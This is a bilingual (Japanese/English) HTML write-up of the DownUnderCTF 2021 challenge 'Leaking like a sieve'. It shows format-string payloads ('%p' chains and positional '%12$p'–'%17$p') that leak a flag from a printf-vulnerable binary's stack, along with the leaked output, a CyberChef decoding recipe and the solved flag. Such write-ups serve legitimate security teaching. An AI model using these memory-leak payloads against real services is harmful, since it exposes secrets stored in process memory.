@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Leaking like a sieve (DownUnderCTF 2021) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>Leaking like a sieve</h1>
+<span class="language-selector-ja">
+<p>
+TCPサーバの接続情報と、ELFファイル <code>hellothere</code> が与えられた。
+</p><p>
+このファイルを<common-tool data-lang="ja">TDM-GCC</common-tool>の<code>objdump</code>で逆アセンブルすると、<code>main</code>関数において、<br>
+<code>./flag.txt</code>の内容を<code>-0x30(%rbp)</code>に読み込んだ後、
+入力を<code>-0x50(%rbp)</code>に読み込んで<code>printf</code>関数の第1引数に渡しているのが読みとれた。
+</p>
+</span>
+<span class="language-selector-en">
+<p>
+Information to connect to a TCP server and a ELF file <code>hellothere</code> were given.
+</p><p>
+Disassembling this file via <code>objdump</code> in <common-tool data-lang="en">TDM-GCC</common-tool>,
+I found that the function <code>main</code> reads the contents of <code>./flag.txt</code> to <code>-0x30(%rbp)</code>,<br>
+and then read some input to <code>-0x50(%rbp)</code> and pass the input as the first argument of the function <code>printf</code>.
+</p>
+</span>
+<p class="language-selector-en">
+When I gave this as an input:
+</p>
+<code-block data-extension="txt">
+%p %p %p %p %p %p %p %p %p %p
+</code-block>
+<p class="language-selector-ja">
+を入力として与えると、
+</p>
+<p class="language-selector-en">
+This was printed:
+</p>
+<code-block data-extension="txt">
+Hello there, 0x7ffe79d42eb0 0x7f4d4a7698c0 (nil) 0xe 0x7f4d4a9954c0 0x7ffe79d45580 0x55b1688e7260 0x7025207025207025 0x2520702520702520 0x2070252070252070
+</code-block>
+<span class="language-selector-ja">
+<p>
+が出力され、入力した内容が8番目以降のデータとして使われていることが読み取れた。
+</p><p>
+さらに、<code>./flag.txt</code>の内容は入力の0x20バイト先に格納されており、これは1個8バイトの要素4個分である。<br>
+これを踏まえ、以下を入力として与えた。
+</p>
+</span>
+<span class="language-selector-en">
+<p>
+This implies that the input data is used as the 8th data and later.
+</p><p>
+Moreover, the contents of <code>./flag.txt</code> is stored 0x20 bytes ahead from the input. This is a room for four 8-byte elements.<br>
+Based on these, I gave this as an input:
+</p>
+</span>
+<code-block data-extension="txt">
+%12$p%13$p%14$p%15$p%16$p%17$p
+</code-block>
+<p class="language-selector-ja">
+すると、以下が出力された、
+</p>
+<p class="language-selector-en">
+As a result, this was printed:
+</p>
+<code-block data-extension="txt">
+Hello there, 0x30667b46544355440x3370355f74346d720x6d5f7233316631630x7d21677364330x7fff5afa6da00xc1cb9de7027db700
+</code-block>
+
+<p class="language-selector-ja">
+得られた出力を以下の<common-tool data-lang="ja">CyberChef</common-tool>のRecipeで変換することで、flagが得られた。
+</p>
+<p class="language-selector-en">
+I obtained the flag by converting this output via this Recipe on <common-tool data-lang="en">CyberChef</common-tool>.
+</p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=Fork('0x','',false)Find_/_Replace(%7B'option':'Regex','string':'%5E(.(.%7B2%7D)*)$'%7D,'0$1',true,false,true,false)From_Hex('Auto')Reverse('Character')&input=MHgzMDY2N2I0NjU0NDM1NTQ0MHgzMzcwMzU1Zjc0MzQ2ZDcyMHg2ZDVmNzIzMzMxNjYzMTYzMHg3ZDIxNjc3MzY0MzMweDdmZmY1YWZhNmRhMDB4YzFjYjlkZTcwMjdkYjcwMA"
+>Fork, Find / Replace, From Hex, Reverse - CyberChef</a></p>
+
+<div class="flag">DUCTF{f0rm4t_5p3c1f13r_m3dsg!}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">DownUnderCTF 2021</a>
+</p>
+</body>
+</html>
